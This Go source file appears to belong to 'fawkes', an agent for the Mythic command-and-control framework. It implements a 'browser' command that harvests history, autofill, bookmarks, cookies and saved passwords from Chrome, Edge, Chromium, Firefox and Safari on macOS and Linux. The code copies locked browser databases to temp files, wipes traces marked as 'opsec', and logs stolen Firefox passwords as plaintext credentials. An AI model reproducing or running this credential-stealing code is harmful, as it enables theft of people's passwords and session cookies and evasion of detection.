//go:build !windows

package commands

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// BrowserCommand implements browser data harvesting on macOS and Linux.
// Supports history, autofill, and bookmarks from Chromium-based browsers.
// Passwords and cookies require platform-specific key management (DPAPI on Windows,
// Keychain on macOS) and are only supported on Windows.
type BrowserCommand struct{}

func (c *BrowserCommand) Name() string { return "browser" }
func (c *BrowserCommand) Description() string {
	return "Harvest history, autofill, and bookmarks from Chromium-based browsers and Firefox"
}

func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
	var args browserArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = "history"
			args.Browser = "all"
		}
	}

	if args.Action == "" {
		args.Action = "history"
	}
	if args.Browser == "" {
		args.Browser = "all"
	}

	switch strings.ToLower(args.Action) {
	case "history":
		return browserHistory(args)
	case "autofill":
		return browserAutofill(args)
	case "bookmarks":
		return browserBookmarks(args)
	case "downloads":
		return browserDownloads(args)
	case "cookies":
		if strings.EqualFold(args.Browser, "firefox") {
			return browserFirefoxCookies(args)
		}
		return browserChromiumCookies(args)
	case "passwords":
		result := browserChromiumPasswords(args)
		result = appendFirefoxPasswords(result, args)
		result = appendSafariPasswords(result)
		return result
	default:
		return errorf("Unknown action: %s. Use: history, autofill, bookmarks, downloads, cookies (Firefox cookies on all platforms; Chromium cookies Windows-only)", args.Action)
	}
}

func appendFirefoxPasswords(result structs.CommandResult, args browserArgs) structs.CommandResult {
	entries, errors := browserFirefoxPasswords(args)
	if len(entries) == 0 && len(errors) == 0 {
		return result
	}

	var sb strings.Builder
	sb.WriteString(result.Output)
	sb.WriteString(fmt.Sprintf("\n=== Firefox Passwords (%d entries) ===\n\n", len(entries)))
	for _, e := range entries {
		sb.WriteString(fmt.Sprintf("[%s] %s\n  User: %s\n  Pass: %s\n\n", e.Browser, e.URL, e.Username, e.Password))
	}
	for _, errMsg := range errors {
		sb.WriteString(fmt.Sprintf("  %s\n", errMsg))
	}
	result.Output = sb.String()

	var creds []structs.MythicCredential
	if result.Credentials != nil {
		creds = *result.Credentials
	}
	for _, e := range entries {
		if e.Password != "" && e.Username != "" {
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Account:        e.Username,
				Credential:     e.Password,
				Realm:          e.URL,
				Comment:        fmt.Sprintf("Firefox saved password (%s)", e.Browser),
			})
		}
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}

	return result
}

// browserPaths returns the User Data directories for supported Chromium-based browsers
// on macOS and Linux.
func browserPaths(browser string) map[string]string {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}

	var all map[string]string
	switch runtime.GOOS {
	case "darwin":
		all = map[string]string{
			"Chrome":   filepath.Join(home, "Library", "Application Support", "Google", "Chrome"),
			"Chromium": filepath.Join(home, "Library", "Application Support", "Chromium"),
			"Edge":     filepath.Join(home, "Library", "Application Support", "Microsoft Edge"),
			"Firefox":  filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles"),
		}
	case "linux":
		all = map[string]string{
			"Chrome":   filepath.Join(home, ".config", "google-chrome"),
			"Chromium": filepath.Join(home, ".config", "chromium"),
			"Edge":     filepath.Join(home, ".config", "microsoft-edge"),
			"Firefox":  filepath.Join(home, ".mozilla", "firefox"),
		}
	default:
		return nil
	}

	switch strings.ToLower(browser) {
	case "chrome":
		result := make(map[string]string)
		if v, ok := all["Chrome"]; ok {
			result["Chrome"] = v
		}
		if v, ok := all["Chromium"]; ok {
			result["Chromium"] = v
		}
		return result
	case "edge":
		return map[string]string{"Edge": all["Edge"]}
	case "chromium":
		return map[string]string{"Chromium": all["Chromium"]}
	case "firefox":
		return map[string]string{"Firefox": all["Firefox"]}
	default:
		return all
	}
}

// openBrowserDB opens a Chromium SQLite database by copying it to a temp file first.
// On non-Windows, browser processes hold exclusive locks on their databases. Copying
// the file first avoids contention. Falls back to immutable mode if copy fails.
func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
	// Strategy 1: Copy the DB to a temp file to avoid lock contention
	srcData, readErr := os.ReadFile(dbPath)
	if readErr == nil {
		defer structs.ZeroBytes(srcData) // opsec: clear browser DB data from memory
		tmpFile, tmpErr := os.CreateTemp("", "")
		if tmpErr == nil {
			tmpPath := tmpFile.Name()
			if _, writeErr := tmpFile.Write(srcData); writeErr == nil {
				tmpFile.Close()
				// Also copy WAL and SHM journals if they exist — required for WAL-mode DBs
				if walData, walErr := os.ReadFile(dbPath + "-wal"); walErr == nil {
					os.WriteFile(tmpPath+"-wal", walData, 0600)
					structs.ZeroBytes(walData) // opsec: clear WAL data
				}
				if shmData, shmErr := os.ReadFile(dbPath + "-shm"); shmErr == nil {
					os.WriteFile(tmpPath+"-shm", shmData, 0600)
					structs.ZeroBytes(shmData) // opsec: clear SHM data
				}
				db, dbErr := sql.Open("sqlite", tmpPath)
				if dbErr == nil {
					if pingErr := db.Ping(); pingErr == nil {
						cleanup := func() {
							db.Close()
							secureRemove(tmpPath)
							secureRemove(tmpPath + "-wal")
							secureRemove(tmpPath + "-shm")
						}
						return db, cleanup, nil
					}
					db.Close()
				}
			} else {
				tmpFile.Close()
			}
			secureRemove(tmpPath)
			secureRemove(tmpPath + "-wal")
			secureRemove(tmpPath + "-shm")
		}
	}

	// Strategy 2: Open in immutable mode (read-only, no locking)
	immutableURI := "file://" + dbPath + "?immutable=1"
	db, err := sql.Open("sqlite", immutableURI)
	if err != nil {
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
	}
	if pingErr := db.Ping(); pingErr != nil {
		db.Close()
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), pingErr)
	}
	cleanup := func() { db.Close() }
	return db, cleanup, nil
}
